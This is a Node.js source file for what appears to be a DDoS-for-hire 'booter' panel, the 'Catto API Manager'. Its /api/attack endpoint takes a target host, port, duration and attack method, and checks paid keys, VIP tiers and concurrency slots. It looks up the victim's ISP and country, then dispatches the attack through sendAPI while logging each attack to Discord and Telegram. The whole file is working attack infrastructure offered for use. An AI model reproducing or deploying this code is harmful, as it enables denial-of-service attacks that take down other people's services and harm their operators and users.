const express = require("express");
const app = express();
const router = express.Router();

const fs = require("fs");
const moment = require("moment");
const axios = require("axios");
const { Webhook, MessageBuilder } = require("discord-webhook-node");
const clc = require("cli-color");

const { parseJsonFile } = require("./functions/parseJsonFile");
const { attack_logs } = require("./functions/attack_logs");
const { sendAPI } = require("./functions/apis");
const { sendTelegramWebhook } = require("./functions/telegram");

const now = new Date();
const year = now.getFullYear();
const month = ("0" + (now.getMonth() + 1)).slice(-2);
const day = ("0" + now.getDate()).slice(-2);
const options = { hour12: false };
const time = now.toLocaleTimeString([], options);
const formattedDate = `${year}/${month}/${day} ${time}`;
exports.formattedDate = formattedDate;

const read_config = fs.readFileSync("./assets/json_files/config.json");
let config = JSON.parse(read_config);

const API = fs.readFileSync("./assets/json_files/methods.json");
let apis = JSON.parse(API);

const KEYS = fs.readFileSync("./assets/json_files/keys.json");
let keyData = JSON.parse(KEYS);

let slots_taken = 0;
let method_slots = {};
let key_slots = {};
let attacked_hosts = {};

parseJsonFile("./assets/json_files/keys.json");
parseJsonFile("./assets/json_files/config.json");
parseJsonFile("./assets/json_files/methods.json");

console.log(`${clc.whiteBright.bold()}[${formattedDate}] ${clc.blueBright("Catto")} Manager Webserver ${clc.green.bold("Started")} on Port ${config.webserver_settings.port}`);
console.log(`${clc.whiteBright.bold()}[${formattedDate}] ${clc.blueBright("Catto")} Manager Started ${clc.green.bold("Successfully")}`);

app.listen(config.webserver_settings.port);

app.set("view engine", "js");
app.set("trust proxy", 1);

app.get("/", (_req, res) => {
  res.status(200).json("Catto API Manager, Made by Kitty.");
});

app.get("/api/attack", async (req, res) => {
  const KEYS = fs.readFileSync("./assets/json_files/keys.json");
  let keyData = JSON.parse(KEYS);
  const METHODS = fs.readFileSync("./assets/json_files/methods.json");
  let apis = JSON.parse(METHODS);
  const host = req.query.host;
  const port = req.query.port;
  const time = req.query.time;

  const startTime = process.hrtime();
  const method = req.query.method;
  const key = req.query.key;
  const username = req.query.username;

  if (!keyData[key]) return res.send({ error: true, message: "invalid key." });
  if (!keyData[key].user) return res.send({ error: true, message: "invalid username" });
  if (keyData[key].banned == true) return res.send({ error: true, message: "key is banned." });
  if (config.attack_settings.attacks.enabled == false) return res.send({ error: true, message: "Attacks are Disabled." });
  if (!(host && port && time && method && key && username)) return res.send({ error: true, message: "missing parameters." });
  if (!apis[method]) return res.send({ error: true, message: "invalid method." });
  if (method_slots[method] == apis[method].slots) return res.send({ error: true, message: "Max Slots Reached for This Method." });
  if (keyData[key].vip == false && apis[method].network == "vip") return res.send({ error: true, message: "You need VIP access." });
  if (config.attack_settings.blackisted_hosts.includes(host)) return res.send({ error: true, message: "host is blacklisted." });
  if (time > keyData[key].time) return res.send({ error: true, message: "maximum time reached." });
  if (time > apis[method].maxtime) return res.send({ error: true, message: "maximum time for method reached." });
  if (key_slots[key] == keyData[key].maxCons) return res.send({ error: true, message: "maximum concurrents reached." });
  if (slots_taken == config.attack_settings.attacks.max_slots) return res.send({ error: true, message: "Maximum slots reached." });
  if (attacked_hosts.hasOwnProperty(host)) return res.send({ error: true, message: "Host already being attacked." });

  if ("expiry" in keyData[key]) {
    const expiry = moment(keyData[key].expiry.toString(), ["MMMM DD, YYYY", "x", "X", "MM/DD/YYYY"]);
    if (expiry.isSameOrBefore(moment())) return res.status(401).json({ error: true, message: "Key has expired." });
  }

  let ipInfo = {};
  try {
    const response = await axios.get(`http://ip-api.com/json/${host}`);
    ipInfo = response.data;
  } catch (err) {
    ipInfo = { isp: "Unknown", org: "Unknown", country: "Unknown" };
  }

  const user = keyData[key].user;
  const main = new Webhook(config.discord_settings.webhook_settings.webhook);
  const colour = config.discord_settings.webhook_settings.embed_colour;

  const net = new MessageBuilder()
    .setTitle("API Logs")
    .setColor(`${colour}`)
    .addField(`Host`, `${host}`, true)
    .addField(`Port`, `${port}`, true)
    .addField(`Time`, `${time}`, true)
    .addField(`Method`, `${method}`, true)
    .addField(`Key`, `${key}`, true)
    .addField(`User`, `${user}`, true)
    .addField(`ISP`, `${ipInfo.isp}`, true)
    .addField(`Org`, `${ipInfo.org}`, true)
    .addField(`Country`, `${ipInfo.country}`, true)
    .setTimestamp();

  const telegramMessage = `Attack Sent\nUser: <b>${user}</b>\nKey: <code>${key}</code>\nHost: <code>${host}</code>\nPort: <code>${port}</code>\nTime: <code>${time}</code>\nMethod: <b>${method}</b>\nISP: <i>${ipInfo.isp}</i>\nCountry: <i>${ipInfo.country}</i>`;

  if (config.log_settings.telegram_logs == true) {
    sendTelegramWebhook(config.telegram_settings.bot_token, config.telegram_settings.chat_id, telegramMessage, true);
  }
  if (config.log_settings.webhook_logs == true) {
    main.send(net);
  }
  if (config.log_settings.attack_logs == true) {
    attack_logs(`User: ${user} | Key: ${key}| Host: ${host} | Port: ${port} | Time: ${time} | Method: ${method}`);
  }
  if (config.log_settings.console_logs == true) {
    console.log(`[${formattedDate}] Key: ${key} | Username: ${user} | Host: ${host} | Port: ${port} | Time: ${time} | Method: ${method}`);
  }

  sendAPI(host, port, time, method);

  attacked_hosts[host] = true;
  key_slots[key] = (key_slots[key] || 0) + 1;
  slots_taken += 1;
  method_slots[method] = (method_slots[method] || 0) + 1;

  const elapsedTime = process.hrtime(startTime);
  const durationInMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;

  const sent = {
    host,
    port,
    time,
    method,
    user,
    isp: ipInfo.isp,
    org: ipInfo.org,
    country: ipInfo.country,
    running: `${key_slots[key]}/${keyData[key].maxCons}`,
    vip: keyData[key].vip,
    response_time: durationInMs.toFixed(2) + " ms"
  };

  res.status(200).json({ success: true, data: sent });

  setTimeout(() => {
    method_slots[method] -= 1;
    slots_taken -= 1;
    key_slots[key] -= 1;
    delete attacked_hosts[host];
  }, parseInt(time) * 1000);
});

module.exports = { router };